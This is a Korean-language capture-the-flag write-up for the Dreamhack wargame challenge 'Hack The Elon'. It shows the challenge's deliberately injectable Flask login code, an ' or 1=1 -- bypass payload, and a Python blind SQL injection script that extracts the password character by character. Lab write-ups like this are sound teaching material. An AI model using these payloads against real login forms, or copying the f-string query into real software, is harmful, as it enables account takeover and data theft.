---
title: "드림핵 lv.1 - Hack The Elon"
date: 2025-02-25 00:21:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, Blind SQL Injection] 
description: 드림핵 Hack The Elon 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/1809](https://dreamhack.io/wargame/challenges/1809)

# 문제 설명

**이 문제는 제 30회 해킹캠프 `박기범 - 웹 해킹의 첫 발걸음` 실습 플랫폼에 출제된 문제입니다.**

Elon Musk의 비밀번호를 알아내어 부자가 되어 보아요.  
비밀번호는 a, b, c, d, e 5개의 알파벳으로 이루어진 4글자에요.  
비밀번호는 메모해두는게 좋을거에요. :)

플래그 형식은 `HACKCAMP{...}` 입니다.

--- 
# 문제 풀이
# 웹사이트 분석
### main page(login)
메인 페이지에 접속하면 곧바로 로그인 창이 뜨는 것을 알 수 있다.<br />

```html
<form method="POST">
	<input type="text" name="username" placeholder="아이디" required=""><br>
	<input type="password" name="password" placeholder="비밀번호" required=""><br>
	<input type="submit" value="로그인">
</form>
```
개발자 도구를 열어서 HTML 코드를 먼저 살펴보면 로그인 form은 당연하게도 POST 메소드 요청을 보낸다. <br /> 
username과 password 값을 프론트 단에서 읽어서 서버로 보내는 코드이다. <br />

guest, guest 혹은 admin, admin 값으로 로그인을 시도해보니 역시나 실패했다고 뜬다. <br />

다음으로는 SQL Injection도 시도해 보았다.
`username: "' or 1=1 --", password: "something"`를 값으로 입력하니 로그인에 성공하고 곧바로 flag가 추출됐다. 
``` 
|* RESULT *|
로그인 성공!

반가워요. 여기 플래그를 드릴게요.  
HACKCAMP{ELON의비밀번호4자리_pW_bl1nd_wowow_but_swqpbabo}  
  
설마 Blind SQL 기법으로 안푼건 아니죠... ㅋㅋㅋ
```

처음에는 그냥 SQL Injection을 연습하는 아주 간단한 문제인 줄 알았다. 하지만 결과의 맨 마지막 문장을 보면 "설마 Blind SQL 기법으로 안푼건 아니죠... ㅋㅋㅋ"를 보자마자 속았다는 걸 깨달았다. <br />

해당 플래그를 제출해보니 역시나 잘못된 플래그였다. 사람들이 SQL Injection으로 먼저 시도를 할 것을 예상을 하고 심어놓은 대본이다. 좀 웃겼다.<br />

당연하게도 이쯤 되면 해당 문제는 Blind SQL Injection 기법을 사용해야 하는 구나 라는 것을 알 수 있다. 플래그 중간에 보면 **ELON의비밀번호4자리**가 보이는데 이 부분을 비밀번호로 덮어쓰면 될 것 같다.<br />
이제 코드를 살펴보자.
## 코드 분석
### app.py
```python
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT UNIQUE NOT NULL,
                        password TEXT NOT NULL
                    )''')
    cursor.execute("INSERT OR IGNORE INTO users (username, password) VALUES ('elon', '(REDACTED숨겨진정보!)')")
    conn.commit()
    conn.close()

# init_db()

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()

        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        cursor.execute(query)
        user = cursor.fetchone()
        conn.close()

        if user:
            return """
            <html>
                <head><title>Login Success</title></head>
                <body class="success">
                    <h2>로그인 성공!</h2>
                    <p>반가워요. 여기 플래그를 드릴게요.<br>HACKCAMP{ELON의비밀번호4자리_pW_bl1nd_wowow_but_swqpbabo}<br><br>설마 Blind SQL 기법으로 안푼건 아니죠... ㅋㅋㅋ</p>
                    <a href="/">돌아가기</a>
                </body>
            </html>
            """
        else:
            return """
            <html>
                <head><title>Login Failed</title></head>
                <body class="fail">
                    <h2>로그인 실패!</h2>
                    <p>아이디 또는 비밀번호가 잘못되었습니다.</p>
                    <a href="/">다시 시도하기</a>
                </body>
            </html>
            """
```
Flask를 이용해서 구현된 백엔드 코드이다. 불필요한 부분들은 생략하고 가져왔으니 참고 바란다.<br />

login() 함수에서 POST 메소드 처리 방식을 보면 SQL Injection 예방이 전혀 안돼있다. 그래서 로그인 할 때에 내가 입력했던 쿼리문이 작동한듯 하다.<br />

그리고 서버가 작동될 때 실행되는 init_db()를 보면 elon의 username은 당연하게도 elon인 걸 알 수 있다.<br />
그리므로 `SELECT * FROM users WHERE username=elon AND password={}` 이러한 쿼리를 이용하여 문자를 하나하나 시도하여 로그인이 성공할 때를 기준으로 비밀번호를 알아내면 된다.<br/>

문제를 살펴보면 비밀번호는 a, b, c, d, e 중 하나로 이루어져있고 총 4글자라고 한다. 다행히 시간이 비밀번호 구하는 과정이 그렇게 오래 걸리진 않을 것 같다.
## 최종 풀이
```python
import requests

URL = "http://host1.dreamhack.games:23012/"
chars = ['a', 'b', 'c', 'd', 'e']

pw = ""
for i in range(1, 5):
    for c in chars:
        form = {
            "username": f"elon' AND SUBSTR(password, {i}, 1) = '{c}'--",
            "password": "random123"
        }
        resp = requests.post(URL, data=form)

        if "HACKCAMP" in resp.text:
            pw += c
            break
            
print(pw)
```
특별히 신경써야 하는 부분은 없고 그냥 쿼리 부분만 보면 된다. <br />
자세히보면 username 맨 끝에서 주석 처리를 해주고 있기 때문에 password는 그냥 dummy 값을 넣어줬다. 그리고 username에 메인 쿼리가 들어간다.<br />

elon이라는 이름을 가진 유저의 password의 substring을 계속해서 체크해주는 방식이다. <br />
예를 들어 비밀번호가 "abcd"이면 `substr(password, 1, 1)`의 값은 a가 될 것이고 `substr()` 함수의 인자를 2, 3, 4 이렇게 늘려나가면 b, c, d가 나온다.

이러한 원리로 비밀번호를 한 글자 한 글자 알아낼 수 있다.

그럼 이 비밀번호를 아까 얻었던 가짜 플래그의 적절한 곳에 덮어쓰기 해주면 문제가 풀리게 된다.
# 배운 것
**python에서 requests의 인자가 나타내는 json과 data의 차이를 알게됐다.**

`request.post(url, json=temp)`를 하게 되면 HTTP header에 `Content-Type`이 json으로 전달된다.<br />
그리고 `request.post(url, data=temp)`를 하게 되면 HTTP header에 `Content-Type`이 `x-www-form-urlencoded`로 설정돼 전달된다.

그래서 처음에는 form으로 POST 요청을 해야하는데 어떻게 하지 여러가지 시도를 하다가 조금 삽질의 시간이 필요했다.